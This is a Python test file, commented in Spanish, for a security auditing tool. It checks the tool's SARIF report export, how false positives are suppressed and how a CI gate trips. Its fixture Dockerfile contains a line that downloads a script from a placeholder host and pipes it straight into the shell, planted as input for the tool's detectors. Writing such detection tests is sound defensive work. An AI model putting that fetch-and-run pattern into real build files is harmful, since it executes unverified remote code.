"""Pruebas de exportación SARIF 2.1.0 y de la compuerta de CI."""
import json
import tempfile
import unittest
from pathlib import Path

from c4a import config as config_mod
from c4a import orchestrator, risk, sarif, triage


FIXTURE = {
    "Dockerfile": "FROM ubuntu:latest\nRUN curl http://x.test/i.sh | sh\nCMD [\"/a\"]\n",
    "app.py": "url = 'http://api.example.com/v1'\n",
}


def _run(td: Path):
    target = td / "t"
    out = td / "o"
    target.mkdir()
    out.mkdir()
    for rel, content in FIXTURE.items():
        (target / rel).write_text(content, encoding="utf-8")
    cfgp = td / "a.json"
    cfgp.write_text(json.dumps({
        "audit_name": "sarif-test", "auditor": "t",
        "target": str(target), "output_root": str(out),
        "normativas": ["ISO-27001"], "detectors": ["all"],
        "scope": {"read_only": True},
    }), encoding="utf-8")
    cfg = config_mod.load(cfgp)
    run, findings, _ = orchestrator.run_audit(cfg)
    return cfg, run, findings


class TestSarif(unittest.TestCase):
    def test_sarif_written_and_valid(self):
        with tempfile.TemporaryDirectory() as td:
            cfg, run, findings = _run(Path(td))
            sp = cfg.output_root / "04_informe" / "hallazgos.sarif.json"
            self.assertTrue(sp.exists())
            doc = json.loads(sp.read_text(encoding="utf-8"))
            self.assertEqual(doc["version"], "2.1.0")
            run0 = doc["runs"][0]
            self.assertEqual(run0["tool"]["driver"]["name"], "C4A")
            self.assertGreater(len(run0["results"]), 0)
            for r in run0["results"]:
                self.assertIn(r["level"], ("error", "warning", "note"))
                self.assertTrue(r["ruleId"])
                self.assertTrue(r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"])

    def test_to_sarif_suppresses_false_positive(self):
        with tempfile.TemporaryDirectory() as td:
            cfg, run, findings = _run(Path(td))
            findings[0].status = "false-positive"
            doc = sarif.to_sarif(cfg, run, findings, [])
            res = [r for r in doc["runs"][0]["results"]
                   if r["properties"]["finding_id"] == findings[0].id][0]
            self.assertIn("suppressions", res)

    def test_gate_threshold(self):
        with tempfile.TemporaryDirectory() as td:
            cfg, run, findings = _run(Path(td))
            g_low = risk.gate(findings, "BAJO")
            self.assertTrue(g_low["triggered"])
            self.assertEqual(g_low["count"],
                             sum(1 for f in findings if f.status != "false-positive"))
            # al triar todo como falso positivo, la compuerta no se dispara
            for f in findings:
                triage.append_decision(cfg, f.id, "false-positive", "prueba", "t")
            cfg2 = config_mod.load(cfg.config_path)
            _, findings2, _ = orchestrator.run_audit(cfg2)
            self.assertFalse(risk.gate(findings2, "BAJO")["triggered"])


if __name__ == "__main__":
    unittest.main()
